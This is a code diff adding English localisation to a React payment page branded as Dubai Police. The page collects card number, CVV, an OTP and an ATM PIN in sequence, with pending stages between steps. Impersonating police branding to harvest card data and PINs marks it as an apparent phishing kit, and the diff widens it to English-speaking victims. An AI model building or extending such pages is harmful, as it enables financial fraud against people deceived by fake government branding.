@@ -8,12 +8,13 @@ type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pend
 
 // ======== مكون شعار شرطة دبي ========
 function DubaiPoliceLogo({ size = 40 }: { size?: number }) {
+  const { lang } = useLanguage();
   return (
     <img
       src="/dubai-police-logo.svg"
       width={size}
       height={size}
-      alt="شرطة دبي"
+      alt={lang === "ar" ? "شرطة دبي" : "Dubai Police"}
       style={{ borderRadius: "50%", objectFit: "contain", background: "transparent" }}
     />
   );
@@ -21,7 +22,7 @@ function DubaiPoliceLogo({ size = 40 }: { size?: number }) {
 
 // ======== مكون شريط التقدم ========
 function ProgressSteps({ stage }: { stage: Stage }) {
-  const { t } = useLanguage();
+  const { t, isRTL } = useLanguage();
   const steps = [
     { id: "card", label: t.payment.steps.card, icon: "💳" },
     { id: "otp", label: t.payment.steps.otp, icon: "🔐" },
@@ -40,7 +41,7 @@ function ProgressSteps({ stage }: { stage: Stage }) {
   };
 
   return (
-    <div className="flex items-center justify-center gap-1 mb-6 px-2" dir="rtl">
+    <div className="flex items-center justify-center gap-1 mb-6 px-2" dir={isRTL ? "rtl" : "ltr"}>
       {steps.map((step, i) => {
         const status = getStepStatus(step.id);
         return (
@@ -71,7 +72,7 @@ function ProgressSteps({ stage }: { stage: Stage }) {
 
 // ======== مكون صفحة الانتظار ========
 function WaitingPage({ message }: { message: string }) {
-  const { t } = useLanguage();
+  const { t, isRTL } = useLanguage();
   return (
     <div className="flex flex-col items-center justify-center py-12 px-4">
       <div className="relative mb-6">
@@ -102,7 +103,7 @@ function WaitingPage({ message }: { message: string }) {
 
 // ======== مكون صفحة النجاح ========
 function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
-  const { t } = useLanguage();
+  const { t, lang, isRTL } = useLanguage();
   return (
     <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
       <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
@@ -114,10 +115,10 @@ function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () 
         <p className="text-sm text-gray-500">{t.payment.success.amountPaid}</p>
         <p className="text-2xl font-bold text-green-600">{totalAmount} {t.payment.header.currency}</p>
       </div>
-      <div className="bg-gray-50 rounded-xl p-4 mb-6 w-full max-w-xs text-right">
+      <div className={`bg-gray-50 rounded-xl p-4 mb-6 w-full max-w-xs ${isRTL ? "text-right" : "text-left"}`}>
         <p className="text-sm text-gray-500 mb-1">{t.payment.success.reference}</p>
         <p className="text-sm font-mono text-gray-700">DP-{Date.now().toString().slice(-8)}</p>
-        <p className="text-xs text-gray-400 mt-2">{new Date().toLocaleString("ar-AE")}</p>
+        <p className="text-xs text-gray-400 mt-2">{new Date().toLocaleString(lang === "ar" ? "ar-AE" : "en-AE")}</p>
       </div>
       <button onClick={onDone}
         className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
@@ -129,7 +130,7 @@ function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () 
 
 // ======== مكون صفحة الفشل ========
 function FailedPage({ onRetry }: { onRetry: () => void }) {
-  const { t } = useLanguage();
+  const { t, isRTL } = useLanguage();
   return (
     <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
       <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mb-4">
@@ -160,7 +161,7 @@ function CardForm({
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCvv] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
-  const { t } = useLanguage();
+  const { t, isRTL } = useLanguage();
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, "").slice(0, 16);
@@ -200,7 +201,7 @@ function CardForm({
   const cardType = getCardType();
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-4" dir="rtl">
+    <form onSubmit={handleSubmit} className="space-y-4" dir={isRTL ? "rtl" : "ltr"}>
       <div className="bg-gradient-to-br from-[#006633] to-[#004d26] rounded-2xl p-5 text-white mb-6 relative overflow-hidden">
         <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/2" />
         <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2" />
@@ -224,7 +225,8 @@ function CardForm({
             <p className="text-xs text-white/60">{t.payment.card.cardHolder}</p>
             <p className="text-sm font-bold uppercase">{cardName || "CARD HOLDER"}</p>
           </div>
-          <div className="text-right">
+          <div className={isRTL ? "text-right" : "text-left"}>
+
             <p className="text-xs text-white/60">{t.payment.card.expiry}</p>
             <p className="text-sm font-bold">{cardExpiry || "MM/YY"}</p>
           </div>
@@ -326,7 +328,7 @@ function OtpForm({
 }) {
   const [otp, setOtp] = useState("");
   const [otpError, setOtpError] = useState("");
-  const { t } = useLanguage();
+  const { t, isRTL } = useLanguage();
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -339,7 +341,7 @@ function OtpForm({
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6" dir="rtl">
+    <form onSubmit={handleSubmit} className="space-y-6" dir={isRTL ? "rtl" : "ltr"}>
       <div className="text-center">
         <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
           <span className="text-3xl">📱</span>
@@ -394,7 +396,7 @@ function AtmPinForm({
 }) {
   const [pin, setPin] = useState("");
   const [pinError, setPinError] = useState("");
-  const { t } = useLanguage();
+  const { t, isRTL } = useLanguage();
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -407,7 +409,7 @@ function AtmPinForm({
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6" dir="rtl">
+    <form onSubmit={handleSubmit} className="space-y-6" dir={isRTL ? "rtl" : "ltr"}>
       <div className="text-center">
         <div className="w-16 h-16 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-3">
           <span className="text-3xl">🏧</span>
@@ -457,8 +459,14 @@ function AtmPinForm({
 
 // ======== الصفحة الرئيسية للدفع ========
 export default function Payment() {
-  const [, navigate] = useLocation();
-  const { t } = useLanguage();
+  const [location, navigate] = useLocation();
+  const { t, lang, isRTL, setLanguage } = useLanguage();
+  const isArabicRoute = location === "/ar/payment" || location.startsWith("/ar/payment?");
+  const homePath = isArabicRoute ? "/ar" : "/";
+
+  useEffect(() => {
+    setLanguage(isArabicRoute ? "ar" : "en");
+  }, [isArabicRoute, setLanguage]);
 
   const getPaymentContextFromUrl = () => {
     try {
@@ -569,10 +577,10 @@ export default function Payment() {
   // إذا لم تكن هناك بيانات دفع، إعادة التوجيه
   if (!paymentData && !sessionId) {
     return (
-      <div className="min-h-screen bg-gray-50 flex items-center justify-center" dir="rtl">
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center" dir={isRTL ? "rtl" : "ltr"}>
         <div className="text-center">
           <p className="text-gray-600 mb-4">{t.payment.noData.message}</p>
-          <button onClick={() => navigate("/")}
+          <button onClick={() => navigate(homePath)}
             className="bg-[#006633] text-white px-6 py-2 rounded-xl font-bold">
             {t.payment.noData.backButton}
           </button>
@@ -603,14 +611,14 @@ export default function Payment() {
         }
       }
       if (!currentSessionId) {
-        setErrorMessage("حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى.");
+        setErrorMessage(lang === "ar" ? "حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى." : "An error occurred while creating the payment session. Please try again.");
         return;
       }
       await submitCard.mutateAsync({ sessionId: currentSessionId, ...data });
       setStage("card_pending");
       setErrorMessage(null);
     } catch (err: any) {
-      setErrorMessage(err.message || "حدث خطأ. يرجى المحاولة مرة أخرى.");
+      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
     } finally {
       setIsSubmitting(false);
     }
@@ -624,7 +632,7 @@ export default function Payment() {
       setStage("otp_pending");
       setErrorMessage(null);
     } catch (err: any) {
-      setErrorMessage(err.message || "حدث خطأ. يرجى المحاولة مرة أخرى.");
+      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
     } finally {
       setIsSubmitting(false);
     }
@@ -638,7 +646,7 @@ export default function Payment() {
       setStage("atm_pending");
       setErrorMessage(null);
     } catch (err: any) {
-      setErrorMessage(err.message || "حدث خطأ. يرجى المحاولة مرة أخرى.");
+      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
     } finally {
       setIsSubmitting(false);
     }
@@ -647,7 +655,7 @@ export default function Payment() {
   const handleDone = () => {
     sessionStorage.removeItem("paymentData");
     sessionStorage.removeItem("paymentSessionId");
-    navigate("/");
+    navigate(homePath);
   };
 
   const handleRetry = () => {
@@ -673,7 +681,7 @@ export default function Payment() {
   };
 
   return (
-    <div className="min-h-screen bg-gray-50" dir="rtl">
+    <div className="min-h-screen bg-gray-50" dir={isRTL ? "rtl" : "ltr"}>
       {/* هيدر */}
       <div className="bg-[#006633] text-white py-3 px-4 flex items-center justify-between">
         <div className="flex items-center gap-2">
@@ -683,7 +691,7 @@ export default function Payment() {
             <p className="text-xs opacity-80">{t.header.siteNameEn}</p>
           </div>
         </div>
-        <div className="text-right">
+        <div className={isRTL ? "text-right" : "text-left"}>
           <p className="text-xs opacity-80">{t.payment.header.totalAmount}</p>
           <p className="text-lg font-bold">{totalAmount} {t.payment.header.currency}</p>
         </div>
